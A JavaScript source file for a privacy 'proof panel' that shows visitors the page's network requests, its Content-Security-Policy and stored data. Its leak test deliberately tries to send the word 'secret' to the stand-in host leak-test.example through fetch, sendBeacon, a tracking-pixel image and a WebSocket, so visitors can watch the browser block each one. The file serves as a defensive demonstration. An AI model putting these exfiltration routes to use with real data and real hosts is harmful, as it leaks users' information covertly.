/* 1999.LOC proof panel. Vanilla JS, no build step.
 *
 * Loads on every tool page. Adds nothing to the page until the visitor opens
 * it, and makes no network request of its own — the evidence it shows is
 * already in the browser.
 *
 * The point of it: every site that uploads your file also says it does not.
 * Prose cannot distinguish the two. So this shows three things the visitor can
 * check rather than believe —
 *
 *   what this page actually did      (the Performance timeline, which records
 *                                     requests whether the code wanted them
 *                                     recorded or not)
 *   what it is allowed to do        (the Content-Security-Policy, enforced by
 *                                     the browser against us)
 *   the browser saying so itself    (a deliberate attempt to leak data, with
 *                                     the refusal reported by the browser's
 *                                     own securitypolicyviolation event)
 *
 * And it states the limit: a page auditing itself could lie. The version that
 * needs no trust is the visitor's own Network tab, or turning off the wifi.
 */
(function () {
  'use strict';

  var mount = document.getElementById('proof');
  if (!mount) return;

  var proof = null;              // window.LOC1999_PROOF
  var violations = [];           // what the browser told us it blocked
  var opened = false;

  /* Listening from the start, so a violation raised during the leak test is
     already recorded by the time the results are read. This is the browser
     reporting on itself; nothing here can fabricate it. */
  document.addEventListener('securitypolicyviolation', function (event) {
    violations.push({
      directive: event.effectiveDirective || event.violatedDirective,
      blocked: event.blockedURI || '',
      at: Date.now(),
    });
  });

  function esc(v) {
    return String(v).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
  }

  function loadProof() {
    if (proof) return Promise.resolve();
    return new Promise(function (resolve, reject) {
      var el = document.createElement('script');
      el.src = '/proof.js';
      el.onload = function () {
        proof = window.LOC1999_PROOF;
        proof ? resolve() : reject(new Error('the proof helpers did not load'));
      };
      el.onerror = function () { reject(new Error('could not load /proof.js')); };
      document.head.appendChild(el);
    });
  }

  // ------------------------------------------------------ what happened

  /* Every request the browser has made, read from the Performance timeline.
     `buffered` is not needed here because getEntriesByType returns the whole
     history, including everything loaded before this script ran. */
  function requests() {
    if (!window.performance || !performance.getEntriesByType) return null;
    return performance.getEntriesByType('resource').map(function (entry) {
      return { url: entry.name, kind: entry.initiatorType || 'other' };
    });
  }

  function storage() {
    var out = [];
    try {
      for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        out.push({ key: key, size: (localStorage.getItem(key) || '').length });
      }
    } catch (e) {
      return null;   // private browsing refuses even to be read
    }
    return out;
  }

  // -------------------------------------------------------- the leak test

  /* Four ways a page could send data somewhere else, tried for real.
   *
   * Each attempt reports only what it *observed* — the request completed, was
   * rejected, was queued, timed out — and the verdict is worked out afterwards
   * against the violations the browser reported. That separation matters:
   *
   *   navigator.sendBeacon returns true when it has *queued* the request, and
   *   the policy check happens after that. Reading the return value as "it
   *   went" made this panel announce a leak that had not happened, which for a
   *   panel whose whole job is credibility is the worst possible bug.
   *
   *   The securitypolicyviolation event is dispatched asynchronously, so a
   *   fetch rejection is in hand before the browser has said why. Classifying
   *   at that moment called a blocked request merely "failed" and threw away
   *   the strongest evidence there is.
   *
   * So: run all four, wait for the events to land, then decide.
   *
   * The target is a .example domain, which the IETF reserves and nobody can
   * register — so even if something did get through, there is no one there. */
  var TARGET = 'https://leak-test.example/collect';
  var SETTLE_MS = 400;

  function tryFetch() {
    return fetch(TARGET + '?data=secret', { mode: 'no-cors' })
      .then(function () { return raw('fetch()', 'completed', 'connect-src', 'The request completed.'); })
      .catch(function (err) {
        return raw('fetch()', 'rejected', 'connect-src', 'Rejected: ' + ((err && err.message) || 'blocked'));
      });
  }

  function tryBeacon() {
    // What analytics uses, precisely because it survives the page being closed.
    if (!navigator.sendBeacon) return Promise.resolve(raw('sendBeacon()', 'unsupported', 'connect-src', 'Not in this browser.'));
    var queued = false;
    try { queued = navigator.sendBeacon(TARGET, 'secret'); } catch (e) { queued = false; }
    return Promise.resolve(queued
      ? raw('sendBeacon()', 'queued', 'connect-src', 'The browser accepted it for sending.')
      : raw('sendBeacon()', 'rejected', 'connect-src', 'The browser would not even queue it.'));
  }

  function tryImage() {
    // The oldest trick there is: the data rides in the URL of an image nobody
    // ever sees. img-src has to forbid it or the policy is decorative.
    var imageUrl = TARGET + '/pixel.gif?data=secret';
    return new Promise(function (resolve) {
      var img = new Image();
      var done = false;
      var finish = function (r) { if (!done) { done = true; resolve(r); } };
      img.onload = function () { finish(raw('an image URL', 'completed', 'img-src', 'The image loaded.', imageUrl)); };
      img.onerror = function () { finish(raw('an image URL', 'rejected', 'img-src', 'The browser would not fetch it.', imageUrl)); };
      img.src = imageUrl;
      setTimeout(function () { finish(raw('an image URL', 'timeout', 'img-src', 'Nothing happened.', imageUrl)); }, 2000);
    });
  }

  function trySocket() {
    if (!window.WebSocket) return Promise.resolve(raw('a WebSocket', 'unsupported', 'connect-src', 'Not in this browser.'));
    var socketUrl = TARGET.replace(/^http/, 'ws') + '/socket';
    return new Promise(function (resolve) {
      var done = false;
      var finish = function (r) { if (!done) { done = true; resolve(r); } };
      try {
        var socket = new WebSocket(socketUrl);
        socket.onopen = function () { socket.close(); finish(raw('a WebSocket', 'completed', 'connect-src', 'The connection opened.', socketUrl)); };
        socket.onerror = function () { finish(raw('a WebSocket', 'rejected', 'connect-src', 'The connection was refused.', socketUrl)); };
        setTimeout(function () { finish(raw('a WebSocket', 'timeout', 'connect-src', 'It never connected.', socketUrl)); }, 2000);
      } catch (err) {
        finish(raw('a WebSocket', 'rejected', 'connect-src', 'Refused before it started.', socketUrl));
      }
    });
  }

  function raw(route, observed, directive, detail, url) {
    return { route: route, observed: observed, directive: directive, detail: detail, url: url || TARGET };
  }

  /* Whether the browser reported blocking *this* request.
   *
   * Matched on the destination as well as the directive. Matching on the
   * directive alone meant one blocked attempt marked every other attempt using
   * the same directive as blocked too — which would hide a genuine leak behind
   * a neighbour's refusal, and a panel that can only report good news is not
   * worth having. */
  function wasBlocked(directive, url) {
    var target = originOf(url);
    return violations.some(function (v) {
      if (String(v.directive || '') !== directive) return false;
      var blocked = String(v.blocked || '');
      // Browsers report the full URL, the origin, or just "eval"/"inline".
      return blocked === '' || blocked.indexOf(target) === 0 || target.indexOf(blocked) === 0;
    });
  }

  function originOf(url) {
    try { return new URL(url, location.href).origin; } catch (e) { return String(url); }
  }

  /* The verdict, once the violation events have had time to arrive.
   *
   * A request the browser refused *and told us it refused* is 'blocked' — the
   * strongest evidence, because the browser said it rather than this page. One
   * that merely did not succeed is 'failed'. 'sent' is reserved for something
   * that both completed and drew no violation, which would be a real leak. */
  function judge(record) {
    var blocked = wasBlocked(record.directive, record.url);
    if (record.observed === 'unsupported') {
      return { route: record.route, outcome: 'unsupported', detail: record.detail };
    }
    if (blocked) {
      return { route: record.route, outcome: 'blocked', detail: 'Your browser refused it: ' + record.directive + '.' };
    }
    if (record.observed === 'completed') {
      return { route: record.route, outcome: 'sent', detail: record.detail + ' Data left the browser.' };
    }
    if (record.observed === 'queued') {
      // sendBeacon reports only that the browser took the request, never what
      // became of it — that is the whole point of it. With no refusal to go on,
      // the honest reading is the pessimistic one.
      return {
        route: record.route,
        outcome: 'sent',
        detail: 'The browser accepted it and gives no way to observe what happened next, so assume it went.',
      };
    }
    return { route: record.route, outcome: 'failed', detail: record.detail };
  }

  function runLeakTest(button) {
    button.disabled = true;
    button.textContent = 'trying…';
    violations = [];
    var box = document.getElementById('proof-leak-results');
    box.innerHTML = '<p class="note">Attempting to send the word “secret” to another domain, four different ways…</p>';

    // Sequentially, so each attempt's violation is attributable to it, then a
    // pause: securitypolicyviolation is dispatched asynchronously and reading
    // it too early loses the browser's own testimony.
    var records = [];
    [tryFetch, tryBeacon, tryImage, trySocket].reduce(function (chain, attempt) {
      return chain.then(function () {
        return attempt().then(function (record) { records.push(record); });
      });
    }, Promise.resolve()).then(function () {
      return new Promise(function (r) { setTimeout(r, SETTLE_MS); });
    }).then(function () {
      var results = records.map(judge);
      var verdict = proof.leakVerdict(results);
      box.innerHTML =
        '<p class="' + (verdict.ok ? 'proof-good' : 'proof-bad') + '"><strong>' +
        esc(verdict.summary) + '</strong></p>' +
        '<table class="proof-table"><tbody>' +
        results.map(function (r) {
          return '<tr><td>' + esc(r.route) + '</td><td class="proof-' + esc(r.outcome) + '">' +
            esc(r.outcome) + '</td><td>' + esc(r.detail) + '</td></tr>';
        }).join('') +
        '</tbody></table>' +
        (violations.length
          ? '<p class="note">Your browser reported ' + violations.length +
            ' policy violation' + (violations.length === 1 ? '' : 's') + ' while that ran: ' +
            esc(violations.map(function (v) { return v.directive; }).join(', ')) +
            '. Those messages come from the browser, not from this page, and you can see them in its console too.</p>'
          : '<p class="note">Your browser did not report a policy violation, which means these were stopped some other way. ' +
            'Check the console for the reason.</p>');
      button.disabled = false;
      button.textContent = 'Run it again';
    });
  }

  // ------------------------------------------------------------- rendering

  function render() {
    var host = location.host;
    var audit = proof.classify(requests() || [], location.origin);
    var stored = storage();
    var things = stored === null ? null : proof.describeStorage(stored);
    var files = proof.sourcesFor(location.pathname);
    var caveat = proof.networkNote(location.pathname);

    mount.innerHTML =
      '<div class="proof-box">' +

      '<h3>1. What this page has actually done</h3>' +
      '<p class="' + (audit.foreign.length ? 'proof-bad' : 'proof-good') + '">' +
        esc(proof.describeNetwork(audit, host)) + '</p>' +
      (caveat ? '<p class="note"><strong>Except:</strong> ' + esc(caveat) + '</p>' : '') +
      '<p class="note">Read out of the browser\'s Performance timeline, which records every request whether ' +
        'the code that made it wanted it recorded or not. ' +
        '<button type="button" class="small" id="proof-show-requests">list them</button></p>' +
      '<div id="proof-requests"></div>' +

      '<h3>2. What this page is allowed to do</h3>' +
      '<p class="note">The policy served with this page, which your browser enforces against it:</p>' +
      '<pre class="proof-csp">' + esc(POLICY) + '</pre>' +
      '<ul class="plain">' +
        '<li><code>default-src &#39;none&#39;</code>: nothing is permitted unless a line below permits it.</li>' +
        '<li><code>connect-src &#39;self&#39;</code>: this page cannot open a connection to any other domain. No analytics, no error reporting, no telemetry: not "we chose not to", but "the browser will not let us".</li>' +
        '<li><code>script-src &#39;self&#39;</code>: no code from anywhere else, ever. No tag managers, no CDN scripts.</li>' +
        '<li><code>form-action &#39;self&#39;</code>: a form on this page cannot submit anywhere else.</li>' +
      '</ul>' +
      '<p class="note">You do not have to take this from us: it is in the response headers, visible in your ' +
        'browser\'s network inspector on this very page.</p>' +

      '<h3>3. Watch your browser refuse</h3>' +
      '<p class="note">This will genuinely try to send data to another domain, four different ways, the same four ' +
        'a tracking script would use. Nothing bad happens; the point is to watch every one fail.</p>' +
      '<p><button type="button" id="proof-leak">Try to leak something</button></p>' +
      '<div id="proof-leak-results"></div>' +

      '<h3>4. What is stored in your browser</h3>' +
      (things === null
        ? '<p class="note">Your browser will not let this page read its own storage, which is a stricter setting than this site needs. Nothing is stored.</p>'
        : '<p class="' + (things.length ? '' : 'proof-good') + '">' + esc(proof.storageVerdict(things)) + '</p>' +
          (things.length
            ? '<table class="proof-table"><tbody>' + things.map(function (t) {
                return '<tr><td><code>' + esc(t.key) + '</code></td><td>' + Math.ceil(t.size / 1024) + ' KB</td><td>' +
                  (t.purpose ? esc(t.purpose) : '<strong class="proof-bad">Not something this site documents.</strong>') +
                  '</td></tr>';
              }).join('') + '</tbody></table>' +
              '<p><button type="button" class="small" id="proof-forget">Delete all of it</button></p>'
            : '')) +
      '<p class="note">Cookies: <code>' + (document.cookie ? esc(document.cookie) : 'none') + '</code>. ' +
        'This site sets none: there is no session to keep and nobody to identify.</p>' +

      '<h3>5. The code that does all this</h3>' +
      '<p class="note">Every line, including this panel. The files behind <em>this</em> tool:</p>' +
      '<ul class="plain">' + files.map(function (file) {
        return '<li><a href="' + esc(proof.sourceLink(file)) + '"><code>' + esc(file) + '</code></a></li>';
      }).join('') + '</ul>' +
      '<p class="note">The whole repository is at <a href="' + esc(proof.REPO) + '">' + esc(proof.REPO) +
        '</a>. What is served here is built from it with no minifier-injected anything, so you can diff the ' +
        'bundle against the source.</p>' +

      '<h3>The limit of all this</h3>' +
      '<p class="note">' +
        'This is a page auditing itself, and a page that wanted to deceive you could deceive you here too. ' +
        'Everything above is worth exactly as much as your willingness to believe this panel is honest. ' +
        'The two checks that need no trust at all: open your browser\'s network inspector and watch, or ' +
        '<strong>turn off your wifi after this page has loaded</strong> and use the tool anyway. ' +
        'It will work, because there is nothing for it to talk to.' +
      '</p>' +

      '</div>';

    document.getElementById('proof-leak').addEventListener('click', function () { runLeakTest(this); });

    var listButton = document.getElementById('proof-show-requests');
    listButton.addEventListener('click', function () {
      var box = document.getElementById('proof-requests');
      if (box.innerHTML) { box.innerHTML = ''; listButton.textContent = 'list them'; return; }
      listButton.textContent = 'hide them';
      var all = audit.own.concat(audit.foreign);
      box.innerHTML = '<table class="proof-table"><tbody>' + all.map(function (r) {
        var foreign = proof.hostOf(r.url, location.origin) !== host;
        return '<tr><td>' + esc(r.kind) + '</td><td class="' + (foreign ? 'proof-bad' : '') + '">' +
          esc(r.url.replace(location.origin, '')) + '</td></tr>';
      }).join('') + '</tbody></table>';
    });

    var forget = document.getElementById('proof-forget');
    if (forget) {
      forget.addEventListener('click', function () {
        if (!confirm('Delete everything this site has stored in your browser? Saved signatures and PGP keys go too.')) return;
        try {
          // Delete exactly what was listed, not the three documented keys:
          // the shell also writes loc1999:seen/read/warned flags, and a button
          // that says "delete all of it" has to leave the list empty. storage()
          // reads them straight back out of localStorage.
          storage().forEach(function (item) { localStorage.removeItem(item.key); });
        } catch (e) { /* nothing else to try */ }
        render();
      });
    }
  }

  /* The policy, written here rather than read from the response, because a page
     cannot read its own response headers without making another request — and
     a panel about not making requests should not make one to prove it. It is
     the same string as src/worker/index.ts and public/_headers, and a test
     holds all three to each other. */
  var POLICY = "default-src 'none'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self'; " +
    "img-src 'self' data: blob:; font-src 'self'; connect-src 'self'; media-src blob:; worker-src 'self'; " +
    "form-action 'self'; base-uri 'none'; frame-ancestors 'none'";

  // ------------------------------------------------------------ the toggle

  var toggle = document.createElement('p');
  toggle.className = 'proof-toggle';
  toggle.innerHTML = '<button type="button" id="proof-open">Prove it</button> ' +
    '<span class="note">Check, rather than believe, that nothing here leaves your browser.</span>';
  mount.parentNode.insertBefore(toggle, mount);

  document.getElementById('proof-open').addEventListener('click', function () {
    var button = this;
    if (opened) {
      mount.innerHTML = '';
      opened = false;
      button.textContent = 'Prove it';
      return;
    }
    button.disabled = true;
    loadProof().then(function () {
      render();
      opened = true;
      button.disabled = false;
      button.textContent = 'Hide the proof';
    }).catch(function (err) {
      button.disabled = false;
      mount.innerHTML = '<p class="error">' + esc(err.message) + '</p>';
    });
  });
})();
